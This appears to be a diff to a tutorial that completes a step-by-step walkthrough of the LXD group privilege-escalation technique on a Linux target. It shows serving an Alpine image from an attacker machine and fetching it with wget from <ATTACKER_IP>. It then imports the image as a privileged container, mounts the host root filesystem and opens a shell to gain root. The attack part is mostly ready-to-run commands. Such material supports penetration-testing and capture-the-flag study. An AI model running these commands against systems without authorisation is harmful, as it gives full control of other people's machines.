@@ -1,4 +1,4 @@
-<h2>1. Check that your target is vulnerable</h2>
+<h2>1. Check your target machine vulnerability</h2>
 
 Once you connect to your target via SSH, you need to run the ID command to see if the machine is vulnerable  
 to this LXD Privilege Escalation exploit (current user must be a member of lxd group).
@@ -34,4 +34,33 @@ It can be done very easily using the pythons built-in function http.server (run 
 > python3 -m http.server
 
 Next, you need to download the tar.gz file, on the target machine, from the http server. You can do that via the browser, but I like to do it
-via the 
+via the tool called wget (run the following command on your target machine):
+> wget <ATTACKER_IP>:8000/<CONTAINER_NAME>.tar.gz
+
+where <ATTACKER_IP> is the ip of the attacker machine and  <CONTAINER_NAME> is the name of the Alpine linux container   
+(for example, alpine-v3.10-x86_64-20191008_1227).
+
+<br>
+
+<h2>4. Configuring the container on the target machine</h2>
+
+And finally, we need to actually "exploit" this.
+For gaining root privileges we need to import the previously downloaded container into lxc.   
+<br>
+After that, we need to give the container privileges, add the root directory as a mount point, and start the container.
+To do all this, run following commands on the target machine:
+> lxc image import ./apline-v3.10-x86_64-20191008_1227.tar.gz --alias myimage  
+> lxc init myimage ignite -c security.privileged=true  
+> lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true  
+> lxc start ignite  
+> lxc exec ignite /bin/sh  
+
+If everything succeded, we should get a bash shell in which we can do the following to actually get to the root directories  
+of the target machine:
+> cd /mnt/root
+
+<br>
+<hr>
+
+And BOOM, we have successfully gained control of the root account, without actually knowing the root password  
+(aka. successful privilege escalation)
